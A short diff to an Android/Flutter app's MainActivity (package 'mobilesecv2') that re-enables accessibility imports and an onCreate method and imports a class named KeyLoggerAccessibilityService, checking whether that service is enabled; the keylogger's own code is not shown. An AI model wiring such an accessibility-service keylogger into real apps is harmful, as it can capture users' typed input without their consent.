@@ -1,7 +1,8 @@
+// Correct placement of imports
 package com.mycompany.mobilesecv2
-
-/*import android.accessibilityservice.AccessibilityServiceInfo  // <-- Added import
-import android.view.accessibility.AccessibilityManager */
+ 
+import android.accessibilityservice.AccessibilityServiceInfo  // <-- Added import
+import android.view.accessibility.AccessibilityManager
 import android.app.AlertDialog
 import android.content.DialogInterface
 import android.content.Intent
@@ -12,6 +13,9 @@ import android.view.KeyEvent
 import io.flutter.embedding.android.FlutterActivity
 import io.flutter.embedding.engine.FlutterEngine
 import io.flutter.plugin.common.MethodChannel
+
+// Import KeyLoggerAccessibilityService at the top
+import com.mycompany.mobilesecv2.KeyLoggerAccessibilityService
 
 class MainActivity : FlutterActivity() {
 
@@ -29,7 +33,7 @@ class MainActivity : FlutterActivity() {
             }
         }
     }
-    /*
+    
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
@@ -61,6 +65,5 @@ class MainActivity : FlutterActivity() {
             serviceInfo.resolveInfo.serviceInfo.name == KeyLoggerAccessibilityService::class.java.name
         }
     }
-    */
 
 }
